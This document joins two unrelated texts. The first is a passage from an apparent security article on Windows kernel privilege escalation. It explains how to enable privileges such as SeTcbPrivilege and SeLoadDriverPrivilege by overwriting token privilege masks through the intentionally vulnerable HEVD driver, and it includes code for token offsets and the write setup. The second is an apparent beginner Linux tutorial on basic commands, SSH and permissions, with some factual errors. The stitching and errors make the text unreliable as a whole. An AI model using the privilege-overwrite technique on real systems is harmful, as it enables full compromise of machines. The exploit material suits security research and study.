trigger it a few times to cover the Enabled and Present bitmasks.  This
enables a whole host of different privileges, namely:
 
  07 0x000000007 SeTcbPrivilege                    Attributes - Enabled
  09 0x000000009 SeTakeOwnershipPrivilege          Attributes - Enabled 
  10 0x00000000a SeLoadDriverPrivilege             Attributes - Enabled 
  17 0x000000011 SeBackupPrivilege                 Attributes - Enabled
  18 0x000000012 SeRestorePrivilege                Attributes - Enabled
 
14 privileges are enabled, in total; the immediately exploitable ones are
shown above.  A proof of concept is again provided in the project git
repository [3].
 
Public samples use a variety of strategies; one of the first released by
NCC uses an older technique from Pwn2Own 2013, in which shellcode is
stashed in a tagWND structure and the bServerSideWindowProc bit is
decremented until it wraps, meaning that the tagWND's window procedure will
be executed without context switching.  The shellcode used NULLs out
winlogon's ACL and injects into the privileged process.  Other samples use
the more modern process token swapping strategy.
 
The point here being that we do not need to execute any shellcode and we
do not need to work to obtain any other primitives. 
 
----[ 4.3 - HEVD
 
HEVD, or the HacksysExtremeVulnerableDriver [16], is an intentionally
vulnerable Windows driver that can be loaded into a system to learn and
research various exploitation strategies and techniques.  It additionally
provides a simple way to demonstrate mitigation evasion strategies on
modern, fully up-to-date systems without having to use 0days.
 
We demonstrate our technique using the arbitrary write bug present in HEVD,
triggerable with the 0x22200b control code.  As mentioned, the “bug” is an
intentional and controllable write-what-where primitive in the driver, 
distilled below for brevity:
 
  NTSTATUS TriggerArbitraryOverwrite(IN PWRITE_WHAT_WHERE 
                                                     UserWriteWhatWhere)
  { 
    What = UserWriteWhatWhere-&gt;What; 
    Where = UserWriteWhatWhere-&gt;Where;
    *(UserWriteWhatWhere-&gt;Where) = *(UserWriteWhatWhere-&gt;What);
  }
 
There are several public demonstrations on exploiting this; most for
Windows 7, several for Windows 10 build 1607.  One from Cn33liz [17]
demonstrates exploiting this via the GDI Reloaded technique presented at
Ekoparty ‘16.  The Reloaded strategy improves upon the original GDI pvscan
strategy, including bypassing the GDI shared handle table KASLR fix
introduced in v1607, by leaking kernel addresses via the global gSharedInfo
table (an old, but clearly still viable leak). 
 
In v1703 (Creators Update), the table structure has been changed and the
leaking addresses removed.  So, clearly the GDI Reloaded technique still
works, provided we can identify another KASLR leak; something tells us one
will turn up.
 
The last sample of note is from GradiusX, which demonstrates exploitation
on a v1703 Windows 10 system.  The sample uses the GDI rw primitive to leak
the EPROCESS structure from the current process, which can then be used to
leak the token address of the running process.  Once the address has been
leaked, it leaks a SYSTEM token address and overwrites, using the GDI
primitive, its resident token with the SYSTEM token.  Thus, the token swap.
Using the GDI primitive to leak the EPROCESS structure (via _THREADINFO)
allows it to bypass the need for a separate KASLR leak and should
consequently work fine from low integrity processes.
 
Our strategy here is pretty simple; there's no need to groom a heap,
execute shellcode, or setup rw primitives.  Due to changes to the
_SEP_TOKEN_PRIVILEGES structure [4], we must issue two separate calls to
DeviceIoControl; one to overwrite the Enabled mask and one to the Present
mask.  As with the previous examples, we fetch our token address and
offsets:
 
  uToken = (USHORT)current_token &amp; 0xffff; 
  _TOKEN = GetHandleAddress(GetCurrentProcessId(), uToken); 
  startTokenOffset = (ULONG)_TOKEN + 0x40; 
  enabled_offset = (ULONG)_TOKEN + 0x48;
 
We then setup our what/where primitives (using the PWRITE_WHAT_WHERE
structure as defined by HEVD):
 
  pww = (PWRITE_WHAT_WHERE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY,
                                    sizeof(WRITE_WHAT_WHERE)); 
  pww-&gt;What = (PULONG_PTR)what; 
  pww-&gt;Where = (PULONG_PTR)startTokenOffset;
 
Then simply trigger the driver via DeviceIoControl.  We perform it a second
time with the enabled_offset as the where.  We now have elevated privileges
enabled on the token.
 
--[ 5 - Conclusions
 
As Microsoft continues to iterate and improve upon baseline mitigation
strategies on Windows, both in userland and in the kernel, attackers
additionally continue to iterate.  The ideas presented here may not be a
breakthrough in offensive kernel exploitation, but we believe they provide
a glimpse of where exploitation patterns are headed.  Towards the logical,
away from the kernel, in the land where applications and scripts and Office
documents frolic with critical, privileged controls.  We've demonstrated
how trivial a write-whatever-where can be exploited in a safe, predictable,
and stable way with only a haiku of information from the kernel.
 
Attacking individual privileges seems to be a logical progression of
existing trends: token swapping, DACL mangling, privileged file writes.
Attackers more often than not are pursuing slices and not wholes; ability
to read or write here, modify this or that file or key.  Limiting the scope
of privileged access increases the overall effectiveness and decreases 
exposure of an attack.  
 
Ideally, we can identify other such privileges to be abused, as they are as
bountiful as they are opaque.  The EPROCESS structure is ripe with flags
and masks controlling various access gears within the kernel.  We did not
touch offensively on impersonation, split access tokens, threads, or other
such facilities, but their primitive potential is all but guaranteed.  The
kernel boogeyman be damned.

<p>Where is Linux Used?
It's fair to say that Linux is a lot more intimidating to approach than Operating System's (OSs) such as Windows. Both variants have their own advantages and disadvantages. For example, Linux is considerably much more lightweight and you'd be surprised to know that there's a good chance you've used Linux in some form or another every day! Linux powers things such as:</p>
<p>Websites that you visit
Car entertainment/control panels
Point of Sale (PoS) systems such as checkout tills and registers in shops
Critical infrastructures such as traffic light controllers or industrial sensors</p>
<p>Flavours of Linux
The name &quot;Linux&quot; is actually an umbrella term for multiple OS's that are based on UNIX (another operating system). Thanks to UNIX being open-source, variants of Linux comes in all shapes and sizes - suited best for what the system is being used for.</p>
<p>For example, Ubuntu &amp; Debian are some of the more commonplace distributions of Linux because it is so extensible. I.e. you can run Ubuntu as a server (such as websites &amp; web applications) or as a fully-fledged desktop. For this series, we're going to be using Ubuntu.</p>
<p>Ubuntu Server can run on systems with only 512MB of RAM</p>
<p>Similar to how you have different versions Windows (7, 8 and 10), there are many different versions/distributions of Linux.</p>
<p>This room has a Ubuntu Linux machine that you can interact with all within your browser whilst following along with this room's material. </p>
<p>However, to get started, simply press the green &quot;Start Machine&quot; button on the top-right of this task indicated by the arrow on the right: </p>
<p>Once deployed, a card will appear at the top of the room:</p>
<p>This contains all of the information for the machine deployed in the room including the IP address and expiry timer - along with buttons to manage the machine. Remember to &quot;Terminate&quot; a machine once you are done with the room. More information on this can be found in the tutorial room.</p>
<p>For now, press &quot;Start Machine&quot; where you will be able to interact with your own Linux machine within your browser whilst following along with this room: </p>
<p>Answer the questions below
I've deployed my first Linux machine!</p>
<p>As we previously discussed, a large selling point of using OSs such as Ubuntu is how lightweight they can be. This, of course, doesn't come without its disadvantages, where for example, often there is no GUI (Graphical User Interface) or what is also known as a desktop environment that we can use to interact with the machine (unless it has been installed). A large part of interacting with these systems is using the &quot;Terminal&quot;.</p>
<p>The &quot;Terminal&quot; is purely text-based and is intimidating at first. However, if we break down some of the commands, after some time, you quickly become familiar with using the terminal!</p>
<p>This is what a terminal looks like
tryhackme@linux1:~$ enter commands here
We need to be able to do basic functions like navigate to files, output their contents and make files! The commands to do so are self-explanatory (once you know what they are of course...)</p>
<p>Let's get started with two of the first commands which I have broken down in the table below:</p>
<p>Command	Description
echo	Output any text that we provide
whoami	Find out what user we're currently logged in as!</p>
<p>See the snippets below for an example of each command being used...</p>
<p>Using echo
tryhackme@linux1:<del>$ echo &quot;Hello Friend!&quot;
Using whoami to find out the username of who we're logged in as
tryhackme@linux1:</del>$ whoami
Try this on your Linux machine now!</p>
<p>So far we've only covered the &quot;echo&quot; and &quot;whoami&quot; commands. Not all that useful when you consider things that we need to do - including navigating the filesystem, read and write to it as well.</p>
<p>In this task, we're going to be learning the commands so that we can do just that. Just like the previous task, I'll display the commands in the table in the next heading &amp; show examples of these commands being used.</p>
<p>Interacting With the Filesystem
As I previously stated, being able to navigate the machine that you are logged into without relying on a desktop environment is pretty important. After all, what's the point of logging in if we can't go anywhere?</p>
<p>Command	Full Name
ls	listing
cd	change directory
cat	concatenate
pwd	print working directory</p>
<p>Listing Files in Our Current Directory (ls)
Before we can do anything such as finding out the contents of any files or folders, we need to know what exists in the first place. This can be done using the &quot;ls&quot; command (short for listing)</p>
<p>Using &quot;ls&quot; to to list the contents of the current directory
tryhackme@linux1:~$ ls
'Important Files' 'My Documents' Notes Pictures</p>
<p>In the screenshot above, we can see there are the following directories/folders:</p>
<p>Important Files
My Documents
Notes
Pictures
Great! You can probably take a guess as to what to expect a folder to contain given by its name.</p>
<p>Pro tip: You can list the contents of a directory without having to navigate to it by using ls and the name of the directory. I.e. ls Pictures</p>
<p>Changing Our Current Directory (cd)
Now that we know what folders exist, we need to use the &quot;cd&quot; command (short for change directory) to change to that directory. Say if I wanted to open the &quot;Pictures&quot; directory - I'd do &quot;cd Pictures&quot;. Where again, we want to find out the contents of this &quot;Pictures&quot; directory and to do so, we'd use &quot;ls&quot; again:</p>
<p>Listing our new directory after we have used &quot;cd&quot;
tryhackme@linux1:~/Pictures$ ls
dog_picture1.jpg dog_picture2.jpg dog_picture3.jpg dog_picture4.jpg
In this case, it looks like there are 4 pictures of dogs!</p>
<p>Outputting the Contents of a File (cat)
Whilst knowing about the existence of files is great — it's not all that useful unless we're able to view the contents of them.</p>
<p>We will come on to discuss some of the tools available to us that allows us to transfer files from one machine to another in a later room. But for now, we're going to talk about simply seeing the contents of text files using a command called &quot;cat&quot;.</p>
<p>&quot;Cat&quot; is short for concatenating &amp; is a fantastic way for us to output the contents of files (not just text files!).</p>
<p>In the screenshot below, you can see how I have combined the use of &quot;ls&quot; to list the files within a directory called &quot;Documents&quot;:</p>
<p>Using &quot;ls&quot; to to list the contents of the current directory
tryhackme@linux1:<del>/Documents$ ls
todo.txt
tryhackme@linux1:</del>/Documents$ cat todo.txt
Here's something important for me to do later!
We've applied some knowledge from earlier in this task to do the following:</p>
<p>Used &quot;ls&quot; to let us know what files are available in the &quot;Documents&quot; folder of this machine. In this case, it is called &quot;todo.txt&quot;.
We have then used cat todo.txt to concatenate/output the contents of this &quot;todo.txt&quot; file, where the contents are &quot;Here's something important for me to do later!&quot;
Pro tip: You can use cat to output the contents of a file within directories without having to navigate to it by using cat and the name of the directory. I.e. cat /home/ubuntu/Documents/todo.txt</p>
<p>Sometimes things like usernames, passwords (yes - really...), flags or configuration settings are stored within files where &quot;cat&quot; can be used to retrieve these.</p>
<p>Finding out the full Path to our Current Working Directory (pwd)
You'll notice as you progress through navigating your Linux machine, the name of the directory that you are currently working in will be listed in your terminal.</p>
<p>It's easy to lose track of where we are on the filesystem exactly, which is why I want to introduce &quot;pwd&quot;. This stands for print working directory.</p>
<p>Using the example machine from before, we are currently in the &quot;Documents&quot; folder — but where is this exactly on the Linux machine's filesystem? We can find this out using this &quot;pwd&quot; command like within the screenshot below:</p>
<p>Using &quot;pwd&quot; to list the full path of the current directory
tryhackme@linux1:<del>/Documents$ pwd
/home/ubuntu/Documents
tryhackme@linux1:</del>/Documents$
Let's break this down:</p>
<p>We already know we're in &quot;Documents&quot; thanks to our terminal, but at this point in time, we have no idea where &quot;Documents&quot; is stored so that we can get back to it easily in the future.
I have used the &quot;pwd&quot; (print working directory) command to find the full file path of this &quot;Documents&quot; folder.
We're helpfully told by Linux that this &quot;Documents&quot; directory is stored at &quot;/home/ubuntu/Documents&quot; on the machine — great to know!
Now in the future, if we find ourselves in a different location, we can just use cd /home/ubuntu/Documents to change our working directory to this &quot;Documents&quot; directory.</p>
<p>Although it doesn't seem like it so far, one of the redeeming features of Linux is truly how efficient you can be with it. With that said, you can only be as efficient as you are familiar with it of course. As you interact with OSs such as Ubuntu over time, essential commands like those we've already covered will start to become muscle-memory.</p>
<p>One fantastic way to show just how efficient you can be with systems like this is using a set of commands to quickly search for files across the entire system that our user has access to. No need to consistently use cd and ls to find out what is where. Instead, we can use commands such as find to automate things like this for us!</p>
<p>This is where Linux starts to become a bit more intimidating to approach -- but we'll break this down and ease you into it.</p>
<p>Using Find
The find command is fantastic in the sense that it can be used both very simply or rather complex depending upon what it is you want to do exactly. However, let's stick to the fundamentals first.</p>
<p>Take the snippet below; we can see a list of directories available to us:</p>
<p>Using &quot;ls&quot; to list the contents of the current directory
tryhackme@linux1:<del>$ ls
Desktop Documents Pictures folder1
tryhackme@linux1:</del>$</p>
<p>Desktop
Documents
Pictures
folder1
Now, of course, directories can contain even more directories within themselves. It becomes a headache when we're having to look through every single one just to try and look for specific files. We can use find to do just this for us!</p>
<p>Let's start simple and assume that we already know the name of the file we're looking for — but can't remember where it is exactly! In this case, we're looking for &quot;passwords.txt&quot;</p>
<p>If we remember the filename, we can simply use find -name passwords.txt where the command will look through every folder in our current directory for that specific file like so:</p>
<p>Using &quot;find&quot; to find a file with the name of &quot;passwords.txt&quot;
tryhackme@linux1:<del>$ find -name passwords.txt
./folder1/passwords.txt
tryhackme@linux1:</del>$</p>
<p>&quot;Find&quot; has managed to find the file — it turns out it is located in folder1/passwords.txt — sweet. But let's say that we don't know the name of the file, or want to search for every file that has an extension such as &quot;.txt&quot;. Find let's us do that too!</p>
<p>We can simply use what's known as a wildcard (*) to search for anything that has .txt at the end. In our case, we want to find every .txt file that's in our current directory. We will construct a command such as find -name *.txt . Where &quot;Find&quot; has been able to find every .txt file and has then given us the location of each one:</p>
<p>Using &quot;find&quot; to find any file with the extension of &quot;.txt&quot;
tryhackme@linux1:<del>$ find -name *.txt
./folder1/passwords.txt
./Documents/todo.txt
tryhackme@linux1:</del>$</p>
<p>Find has managed to find:</p>
<p>&quot;passwords.txt&quot; located within &quot;folder1&quot;
&quot;todo.txt&quot; located within &quot;Documents&quot;
That wasn't so tough, huh!</p>
<p>Using Grep
Another great utility that is a great one to learn about is the use of grep. The grep command allows us to search the contents of files for specific values that we are looking for.</p>
<p>Take for example, the access log of a web server. In this case, the access.log of a web server has 244 entries.</p>
<p>Using &quot;wc&quot; to count the number of entries in &quot;access.log&quot;
tryhackme@linux1:<del>$ wc -l access.log
244 access.log
tryhackme@linux1:</del>$
Using a command like cat isn't going to cut it too well here. Let's say for example if we wanted to search this log file to see the things that a certain user/IP address visited? Looking through 244 entries isn't all that efficient considering we want to find a specific value.</p>
<p>We can use grep to search the entire contents of this file for any entries of the value that we are searching for. Going with the example of a web server's access log, we want to see everything that the IP address &quot;81.143.211.90&quot; has visited (note that this is fictional)</p>
<p>Using &quot;grep&quot; to find any entries with the IP address of &quot;81.143.211.90&quot; in &quot;access.log&quot;
tryhackme@linux1:<del>$ grep &quot;81.143.211.90&quot; access.log
81.143.211.90 - - [25/Mar/2021:11:17 + 0000] &quot;GET / HTTP/1.1&quot; 200 417 &quot;-&quot; &quot;Mozilla/5.0 (Linux; Android 7.0; Moto G(4))&quot;
tryhackme@linux1:</del>$
&quot;Grep&quot; has searched through this file and has shown us any entries of what we've provided and that is contained within this log file for the IP.</p>
<p>Linux operators are a fantastic way to power up your knowledge of working with Linux. There are a few important operators that are worth noting. We'll cover the basics and break them down accordingly to bite-sized chunks.</p>
<p>At an overview, I'm going to be showcasing the following operators:</p>
<p>Symbol / Operator	Description
&amp;	This operator allows you to run commands in the background of your terminal.
&amp;&amp;	This operator allows you to combine multiple commands together in one line of your terminal.
&gt;	This operator is a redirector - meaning that we can take the output from a command (such as using cat to output a file) and direct it elsewhere.
&gt;&gt;	
This operator does the same function of the &gt; operator but appends the output rather than replacing (meaning nothing is overwritten).</p>
<p>Let's cover these in a bit more detail.</p>
<p>Operator &quot;&amp;&quot;
This operator allows us to execute commands in the background. For example, let's say we want to copy a large file. This will obviously take quite a long time and will leave us unable to do anything else until the file successfully copies.</p>
<p>The &quot;&amp;&quot; shell operator allows us to execute a command and have it run in the background (such as this file copy) allowing us to do other things!</p>
<p>Operator &quot;&amp;&amp;&quot;
This shell operator is a bit misleading in the sense of how familiar is to its partner &quot;&amp;&quot;. Unlike the &quot;&amp;&quot; operator, we can use &quot;&amp;&amp;&quot; to make a list of commands to run for example command1 &amp;&amp; command2. However, it's worth noting that command2 will only run if command1 was successful.</p>
<p>Operator &quot;&gt;&quot;
This operator is what's known as an output redirector. What this essentially means is that we take the output from a command we run and send that output to somewhere else.</p>
<p>A great example of this is redirecting the output of the echo command that we learned in Task 4. Of course, running something such as echo howdy will return &quot;howdy&quot; back to our terminal — that isn't super useful. What we can do instead, is redirect &quot;howdy&quot; to something such as a new file!</p>
<p>Let's say we wanted to create a file named &quot;welcome&quot; with the message &quot;hey&quot;. We can run echo hey &gt; welcome where we want the file created with the contents &quot;hey&quot; like so:</p>
<p>Using the &gt; Operator
tryhackme@linux1:<del>$ echo hey &gt; welcome
Using cat to output the &quot;welcome&quot; file
tryhackme@linux1:</del>$ cat welcome
hey
Note: If the file i.e. &quot;welcome&quot; already exists, the contents will be overwritten!</p>
<p>Operator &quot;&gt;&gt;&quot;
This operator is also an output redirector like in the previous operator (&gt;) we discussed. However, what makes this operator different is that rather than overwriting any contents within a file, for example, it instead just puts the output at the end.</p>
<p>Following on with our previous example where we have the file &quot;welcome&quot; that has the contents of &quot;hey&quot;. If were to use echo to add &quot;hello&quot; to the file using the &gt; operator, the file will now only have &quot;hello&quot; and not &quot;hey&quot;.</p>
<p>The &gt;&gt; operator allows to append the output to the bottom of the file — rather than replacing the contents like so:</p>
<p>Using the &gt;&gt; Operator
tryhackme@linux1:<del>$ echo hello &gt;&gt; welcome
Using cat to output the &quot;welcome&quot; file
tryhackme@linux1:</del>$ cat welcome
hey
hello</p>
<p>Nice work on getting to this stage! We covered quite a bit for your first interactions with Linux. However, these are the most essential/functions you're going to be using whenever you interact with a Linux machine.</p>
<p>I hope this room hasn't been too daunting for you to power-on through with. It's as I previously mentioned, you're going to become familiar with these things very quickly because of how often you're going to be using them.</p>
<p>To quickly recap, we've covered the following:</p>
<p>Understanding why Linux is so commonplace today
Interacting with your first-ever Linux machine!
Ran some of the most fundamental commands
Had an introduction to navigating around the filesystem &amp; how we can use commands like find and grep to make finding data even more efficient!
Power up your commands by learning about some of the important shell operators.
Take some time to have a play around in this room. When you feel a little bit more comfortable, progress onto Linux Fundamentals Part 2</p>
<p>Welcome to the second part of the reworked &quot;Linux Fundamentals&quot; series. We'll be applying our knowledge from the first installment in this series, so I highly recommend you completing that room before proceeding further.</p>
<p>In part 2, we'll be ditching the in-browser functionality and help you get started in what is a fundamental skill in being able to login to and control the terminals of remote machines. Not only this, but the room will also have you:</p>
<p>Unlocking the potential of your first few commands by introducing you to using flags and arguments
Advancing your knowledge of the filesystem to perform some more useful commands such as copying and moving files
Discovering how access to files and folders is managed and how we can determine our access.</p>
<p>Running your first few scripts and executables!</p>
<p>The in-browser functionality was used in Linux Fundamentals Part 1 to get you directly connected to your first ever Linux machine without any hassle.</p>
<p>In fact, the in-browser functionality uses the exact same protocol that we are going to be using today. This protocol is called Secure Shell or SSH for short and is the common means of connecting to and interacting with the command line of a remote Linux machine.</p>
<p>We will be deploying two machines in this room:</p>
<p>Your Linux machine
The TryHackMe AttackBox
What is SSH &amp; how Does it Work?</p>
<p>Secure Shell or SSH simply is a protocol between devices in an encrypted form. Using cryptography, any input we send in a human-readable format is encrypted for travelling over a network -- where it is then unencrypted once it reaches the remote machine, such as in the diagram below.</p>
<p>You can learn about the various types of encryption on a TryHackMe room. But for now, we only need to understand that:</p>
<p>SSH allows us to remotely execute commands on another device remotely.
Any data sent between the devices is encrypted when it is sent over a network such as the Internet
Deploying Your Linux Machine</p>
<p>Press the green &quot;Start Machine&quot; button on the top-right of this task and then scroll to the top of the page to see the deployment information like so:</p>
<p>The IP address displayed is the address of your Linux machine that you will be logging into using SSH. Take note of this for now.</p>
<p>Deploying the TryHackMe AttackBox</p>
<p>Looking at the top of the page, press the &quot;Start AttackBox&quot; button to deploy the TryHackMe AttackBox that we will be interacting with. The TryHackMe AttackBox is a Ubuntu Linux machine that is hosted online in the cloud and can be interacted with via your browser. You will be using this to interact with the machine that you deploy in this task.</p>
<p>Using SSH to Login to Your Linux Machine</p>
<p>The syntax to use SSH is very simple. We only need to provide two things:</p>
<ol>
<li>
<p>The IP address of the remote machine</p>
</li>
<li>
<p>Correct credentials to a valid account to login with on the remote machine</p>
</li>
</ol>
<p>For this room, we will be logging in as &quot;tryhackme&quot;, whose password is &quot;tryhackme&quot; without the quotation (&quot;&quot;) marks. Let's use the IP address of the machine displayed in the card at the top of the room as the IP address and this user, to construct a command to log in to the remote machine using SSH. The command to do so is ssh and then the username of the account, @ the IP address of the machine.</p>
<p>But first, we need to open a terminal on the TryHackMe AttackBox. There is an icon placed on the desktop named &quot;Terminal&quot;. And now, we can proceed to input commands.</p>
<p>For example: ssh tryhackme@MACHINE_IP  . Replacing the IP address with the IP address for your Linux target machine. Once executed, we will then be asked to trust the host and then provide a password for the &quot;tryhackme&quot; account, which is also &quot;tryhackme&quot;.</p>
<p>Now that we are connected, any commands that we execute will now execute on the remote machine -- not our own.</p>
<p>Note: When you type a password into an ssh login prompt there is no visible feedback -- you will not be able to see any text or symbols appear as you type the password. It is still working, however, so just type the password and press enter to login.</p>
<p>A majority of commands allow for arguments to be provided. These arguments are identified by a hyphen and a certain keyword known as flags or switches.</p>
<p>We'll later discuss how we can identify what commands allow for arguments to be provided and understanding what these do exactly.</p>
<p>When using a command, unless otherwise specified, it will perform its default behaviour. For example, ls lists the contents of the working directory. However, hidden files are not shown. We can use flags and switches to extend the behaviour of commands.</p>
<p>Using our ls example, ls informs us that there is only one folder named &quot;folder1&quot; as highlighted in the screenshot below. Note that the contents in the screenshots below are only examples.</p>
<p>Using ls to view the contents of a directory
tryhackme@linux2:<del>$ ls
folder1
tryhackme@linux2:</del>$
However, after using the -a argument (short for --all), we now suddenly have an output with a few more files and folders such as &quot;.hiddenfolder&quot;. Files and folders with &quot;.&quot; are hidden files.</p>
<p>Using ls to view hidden folders
tryhackme@linux2:<del>$ ls -a 
.hiddenfolder folder1
tryhackme@linux2:</del>$
Commands that accept these will also have a --help option. This option will list the possible options that the command accepts, provide a brief description and example of how to use it.</p>
<p>Listing the options we can use with ls
tryhackme@linux2:~$ ls --help
Usage: ls [OPTION]... [FILE]...
List information about the FILEs (the current directory by default).
Sort entries alphabetically if none of -cftuvSUX nor --sort is specified.</p>
<p>Mandatory arguments to long options are mandatory for short options too.
-a, --all                  do not ignore entries starting with .
-A, --almost-all           do not list implied . and ..
--author               with -l, print the author of each file
-b, --escape               print C-style escapes for nongraphic characters

This option is, in fact, a formatted output of what is called the man page (short for manual), which contains documentation for Linux commands and applications.</p>
<p>The Man(ual) Page</p>
<p>The manual pages are a great source of information for both system commands and applications available on both a Linux machine, which is accessible on the machine itself and online.</p>
<p>To access this documentation, we can use the man command and then provide the command we want to read the documentation for. Using our ls example, we would use man ls to view the manual pages for ls like so:</p>

<p>Manual page ls(1) line 1 (press h for help or q to quit)</p>
<p>We covered some of the most fundamental commands when interacting with the filesystem on the Linux machine. For example, we covered how to list and find the contents of folders using ls and find and navigating the filesystem using cd. </p>
<p>In this task, we're going to learn some more commands for interacting with the filesystem to allow us to:</p>
<p>create files and folders
move files and folders
delete files and folders
More specifically, the following commands:</p>
<p>Command	Full Name	Purpose
touch	touch	Create file
mkdir	make directory	Create a folder
cp	copy	Copy a file or folder
mv	move	Move a file or folder
rm	remove	Remove a file or folder
file	file	Determine the type of a file
Protip: Similarly to using cat, we can provide full file paths, i.e. directory1/directory2/note for all of these commands</p>
<p>Creating Files and Folders (touch, mkdir)</p>
<p>Creating files and folders on Linux is a simple process. First, we'll cover creating a file. The touch command takes exactly one argument -- the name we want to give the file we create. For example, we can create the file &quot;note&quot; by using touch note. It's worth noting that touch simply creates a blank file. You would need to use commands like echo or text editors such as nano to add content to the blank file.</p>
<p>Using touch to create a new file
tryhackme@linux2:<del>$ touch note
tryhackme@linux2:</del>$ ls<br />
folder1 note
This is a similar process for making a folder, which just involves using the mkdir command and again providing the name that we want to assign to the directory. For example, creating the directory &quot;mydirectory&quot; using mkdir mydirectory.</p>
<p>Creating a new directory with mkdir
tryhackme@linux2:<del>$ mkdir mydirectory
tryhackme@linux2:</del>$ ls<br />
folder1 mydirectory note</p>
<p>Removing Files and Folders (rm)</p>
<p>rm is extraordinary out of the commands that we've covered so far. You can simply remove files by using rm. However, you need to provide the -R switch alongside the name of the directory you wish to remove.</p>
<p>Using rm to remove a file
tryhackme@linux2:<del>$ rm note
tryhackme@linux2:</del>$ ls<br />
folder1 mydirectory
Using rm recursively to remove a directory
tryhackme@linux2:<del>$ rm -R mydirectory
tryhackme@linux2:</del>$ ls<br />
folder1</p>
<p>Copying and Moving Files and Folders (cp, mv)</p>
<p>Copying and moving files is an important functionality on a Linux machine. Starting with cp, this command takes two arguments:</p>
<ol>
<li>
<p>the name of the existing file</p>
</li>
<li>
<p>the name we wish to assign to the new file when copying</p>
</li>
</ol>
<p>cp copies the entire contents of the existing file into the new file. In the screenshot below, we are copying &quot;note&quot; to &quot;note2&quot;.</p>
<p>Using cp to copy a file
tryhackme@linux2:<del>$ cp note note2
tryhackme@linux2:</del>$ ls<br />
folder1 note note2
Moving a file takes two arguments, just like the cp command. However, rather than copying and/or creating a new file, mv will merge or modify the second file that we provide as an argument. Not only can you use mv to move a file to a new folder, but you can also use mv to rename a file or folder. For example, in the screenshot below, we are renaming the file &quot;note2&quot; to be named &quot;note3&quot;. &quot;note3&quot; will now have the contents of &quot;note2&quot;. </p>
<p>Using mv to move a file
tryhackme@linux2:<del>$ mv note2 note3
tryhackme@linux2:</del>$ ls<br />
folder1 note note3</p>
<p>Determining File Type</p>
<p>What is often misleading and often catches people out is making presumptions from files as to what their purpose or contents may be. Files usually have what's known as an extension to make this easier. For example, text files usually have an extension of &quot;.txt&quot;. But this is not necessary.</p>
<p>So far, the files we have used in our examples haven't had an extension. Without knowing the context of why the file is there -- we don't really know its purpose. Enter the file command. This command takes one argument. For example, we'll use file to confirm whether or not the &quot;note&quot; file in our examples is indeed a text file, like so file note.</p>
<p>Using file to determine the contents of a file
tryhackme@linux2:~$ file note
note: ASCII text</p>
<p>As you would have already found out by now, certain users cannot access certain files or folders. We've previously explored some commands that can be used to determine what access we have and where it leads us. </p>
<p>In our previous tasks, we learned how to extend the use of commands through flags and switches. Take, for example, the ls command, which lists the contents of the current directory. When using the -l switch, we can see ten columns such as in the screenshot below. However, we're only interested in the first three columns:</p>
<p>Using ls -lh to list the permissions of all files in the directory
tryhackme@linux2:~$ ls -lh
-rw-r--r-- 1 cmnatic cmnatic 0 Feb 19 10:37 file1
-rw-r--r-- 8 cmnatic cmnatic 0 Feb 19 10:37 file2
Although intimidating, these three columns are very important in determining certain characteristics of a file or folder and whether or not we have access to it. A file or folder can have a couple of characteristics that determine both what actions are allowed and what user or group has the ability to perform the given action -- such as the following:</p>
<p>Read
Write
Execute 
Using su to switch to user2</p>
<p>tryhackme@linux2:~$ su user2
Password:
user2@linux2:/home/tryhackme$
Let's use the &quot;cmnatic.pem&quot; file in our initial screenshot at the top of this task. It has the &quot;-&quot; indicator highlighting that it is a file and then &quot;rw&quot; followed after. This means that only the owner of the file can read and write to this&quot;cmnatic.pem&quot; file but cannot execute it.</p>
<p>Briefly: The Differences Between Users &amp; Groups</p>
<p>We briefly explored this in Linux fundamentals part 1 (namely, the differences between a regular user and a system user). The great thing about Linux is that permissions can be so granular, that whilst a user technically owns a file, if the permissions have been set, then a group of users can also have either the same or a different set of permissions to the exact same file without affecting the file owner itself.</p>
<p>Let's put this into a real-world context; the system user that runs a web server must have permissions to read and write files for an effective web application. However, companies such as web hosting companies will have to want to allow their customers to upload their own files for their website without being the webserver system user -- compromising the security of every other customer. </p>
<p>We'll learn the commands necessary to switch between users below.</p>
<p>Switching Between Users</p>
<p>Switching between users on a Linux install is easy work thanks to the su command. Unless you are the root user (or using root permissions through sudo), then you are required to know two things to facilitate this transition of user accounts:</p>
<p>The user we wish to switch to
The user's password
The su command takes a couple of switches that may be of relevance to you. For example, executing a command once you log in or specifying a specific shell to use. I encourage you to read the man page for su to find out more. However, I will cover the -l or --login switch.</p>
<p>Simply, by providing the -l switch to su, we start a shell that is much more similar to the actual user logging into the system - we inherit a lot more properties of the new user, i.e., environment variables and the likes. </p>
<p>Using su to switch to user2 interactively
tryhackme@linux2:~$ su user2
Password:
user2@linux2:/home/tryhackme$
For example, when using su to switch to &quot;user2&quot;, our new session drops us into our previous user's home directory. </p>
<p>Using su to switch to user2 interactively
tryhackme@linux2:<del>$ su -l user2
Password:
user2@linux2:</del>$ pwd
user2@:/home/user2$
Where now, after using -l, our new session has dropped us into the home directory of &quot;user&quot; automatically. </p>
<p>/etc</p>
<p>This root directory is one of the most important root directories on your system. The etc folder (short for etcetera) is a commonplace location to store system files that are used by your operating system. </p>
<p>For example, the sudoers file highlighted in the screenshot below contains a list of the users &amp; groups that have permission to run sudo or a set of commands as the root user.</p>
<p>Also highlighted below are the &quot;passwd&quot; and &quot;shadow&quot; files. These two files are special for Linux as they show how your system stores the passwords for each user in encrypted formatting called sha512.</p>
<p>Some notable contents of the /etc directory
tryhackme@linux2:/etc$ ls
shadow passwd sudoers sudoers.d</p>
<p>/var</p>
<p>The &quot;/var&quot; directory, with &quot;var&quot; being short for variable data,  is one of the main root folders found on a Linux install. This folder stores data that is frequently accessed or written by services or applications running on the system. For example, log files from running services and applications are written here (/var/log), or other data that is not necessarily associated with a specific user (i.e., databases and the like).</p>
<p>Some notable contents of the /var directory
tryhackme@linux2:/var$ ls
backups log opt tmp</p>
<p>/root</p>
<p>Unlike the /home directory, the /root folder is actually the home for the &quot;root&quot; system user. There isn't anything more to this folder other than just understanding that this is the home directory for the &quot;root&quot; user. But, it is worth a mention as the logical presumption is that this user would have their data in a directory such as &quot;/home/root&quot; by default.</p>
<p>Some notable contents of the /root directory
root@linux2:~# ls
myfile myfolder passwords.xlsx</p>
<p>/tmp</p>
<p>This is a unique root directory found on a Linux install. Short for &quot;temporary&quot;, the /tmp directory is volatile and is used to store data that is only needed to be accessed once or twice. Similar to the memory on your computer, once the computer is restarted, the contents of this folder are cleared out.</p>
